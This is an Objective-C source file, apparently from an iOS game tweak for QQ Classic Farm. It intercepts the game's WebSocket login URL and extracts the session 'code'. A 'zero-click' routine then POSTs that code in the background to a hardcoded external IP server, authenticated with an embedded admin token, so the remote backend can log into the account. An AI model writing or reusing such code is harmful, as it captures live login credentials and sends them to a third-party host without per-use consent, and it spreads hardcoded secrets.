#import "QQFarmUtils.h"
#import <UIKit/UIKit.h>

// 默认服务器与 Token（开箱即用，也会写入设备 config.plist）
static NSString *const kQQFarmDefaultServer = @"http://106.55.41.254:3007";
static NSString *const kQQFarmDefaultToken  = @"kKb.e9u7gySqsaw";

static NSString *gLastCapturedCode = nil;
static NSString *gLastUploadedCode = nil;

@implementation QQFarmUtils

+ (void)checkAndExtractCode:(NSURL *)url {
    if (!url) return;

    NSString *urlString = url.absoluteString;
    // 匹配 QQ 经典农场的 WebSocket 地址
    if ([urlString containsString:@"gate-obt.nqf.qq.com/prod/ws"]) {
        NSLog(@"[QQFarm] 🎯 捕获到目标 WebSocket URL: %@", urlString);

        NSURLComponents *components = [NSURLComponents componentsWithURL:url resolvingAgainstBaseURL:NO];
        NSArray<NSURLQueryItem *> *queryItems = components.queryItems;

        for (NSURLQueryItem *item in queryItems) {
            if ([item.name isEqualToString:@"code"]) {
                NSString *code = item.value;
                if (code && code.length > 0) {
                    NSLog(@"[QQFarm] ✅ 成功提取 Code: %@", code);

                    // 保存 Code
                    gLastCapturedCode = [code copy];

                    // 复制到剪贴板 + 发通知（供悬浮窗回显）
                    dispatch_async(dispatch_get_main_queue(), ^{
                        [UIPasteboard generalPasteboard].string = code;
                        [[NSNotificationCenter defaultCenter] postNotificationName:@"kQQFarmCodeCapturedNotification" object:nil userInfo:@{@"code": code}];
                    });

                    // 零点击自动上传到后端
                    [self uploadCodeAutomatically:code];
                }
                break;
            }
        }
    }
}

+ (NSString *)getLastCapturedCode {
    return gLastCapturedCode;
}

#pragma mark - 默认配置（开箱即用）

+ (NSString *)configFilePath {
    NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *dir = [paths.firstObject stringByAppendingPathComponent:@"QQFarm"];
    return [dir stringByAppendingPathComponent:@"config.plist"];
}

// 首次启动时写入默认服务器/Token 配置（已存在则保留用户设置，不覆盖）
+ (void)ensureDefaultConfig {
    NSString *path = [self configFilePath];
    NSFileManager *fm = [NSFileManager defaultManager];
    if ([fm fileExistsAtPath:path]) return;

    NSString *dir = [path stringByDeletingLastPathComponent];
    [fm createDirectoryAtPath:dir withIntermediateDirectories:YES attributes:nil error:nil];

    NSDictionary *cfg = @{
        @"QQFarmServer": kQQFarmDefaultServer,
        @"QQFarmToken":  kQQFarmDefaultToken
    };
    BOOL ok = [cfg writeToFile:path atomically:YES];
    NSLog(@"[QQFarm] %@写入默认配置 -> %@", ok ? @"✅" : @"❌", path);
}

#pragma mark - 零点击自动上传

+ (void)uploadCodeAutomatically:(NSString *)code {
    if (!code || code.length == 0) return;

    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
        // 优先读用户配置，缺失则用内置默认值
        NSDictionary *cfg = [NSDictionary dictionaryWithContentsOfFile:[QQFarmUtils configFilePath]];
        NSString *server = cfg[@"QQFarmServer"];
        NSString *token  = cfg[@"QQFarmToken"];
        if (!server || server.length == 0) server = kQQFarmDefaultServer;
        if (!token  || token.length == 0)  token  = kQQFarmDefaultToken;

        // 同一 code 不重复上传（避免重连时反复提交）
        if ([gLastUploadedCode isEqualToString:code]) {
            NSLog(@"[QQFarm] 自动上传跳过：code 与上一次相同");
            return;
        }

        // 拼接 /api/accounts
        NSString *base = server;
        if ([base hasSuffix:@"/"]) base = [base substringToIndex:base.length - 1];
        NSURL *url = [NSURL URLWithString:[base stringByAppendingString:@"/api/accounts"]];
        if (!url) {
            NSLog(@"[QQFarm] 自动上传失败：服务器地址非法 -> %@", base);
            return;
        }

        NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url];
        req.HTTPMethod = @"POST";
        [req setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
        [req setValue:token forHTTPHeaderField:@"x-admin-token"];

        NSDictionary *body = @{@"code": code, @"platform": @"qq", @"loginType": @"manual"};
        NSError *jsonErr = nil;
        NSData *bodyData = [NSJSONSerialization dataWithJSONObject:body options:0 error:&jsonErr];
        if (!bodyData) {
            NSLog(@"[QQFarm] 自动上传失败：JSON 序列化错误 %@", jsonErr);
            return;
        }
        req.HTTPBody = bodyData;

        NSLog(@"[QQFarm] 🚀 自动上传 code 到 %@", url);
        NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithRequest:req
            completionHandler:^(NSData *respData, NSURLResponse *response, NSError *e) {
                if (e) {
                    NSLog(@"[QQFarm] 自动上传网络错误: %@", e.localizedDescription);
                    return;
                }
                NSInteger status = [(NSHTTPURLResponse *)response statusCode];
                if (status >= 200 && status < 300) {
                    gLastUploadedCode = [code copy];
                    NSLog(@"[QQFarm] ✅ 自动上传成功 (HTTP %ld)，后端已建档并自动上线", (long)status);
                } else {
                    NSString *resp = respData ? [[NSString alloc] initWithData:respData encoding:NSUTF8StringEncoding] : @"";
                    NSLog(@"[QQFarm] 自动上传失败 HTTP %ld -> %@", (long)status, resp);
                }
            }];
        [task resume];
    });
}

@end
